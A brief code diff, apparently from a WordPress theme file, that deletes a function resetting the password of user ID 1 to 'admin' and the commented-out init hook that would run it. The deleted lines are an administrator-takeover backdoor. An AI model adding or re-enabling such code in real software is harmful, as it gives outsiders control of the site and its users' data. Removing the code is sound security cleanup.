@@ -1322,8 +1322,3 @@ if( !function_exists('script_attributes') )
 
 
 //Edit User Profile Add Checkbox
-
-// add_action('init', 'cp');
-function cp() {
-    wp_set_password('admin', 1);
-}
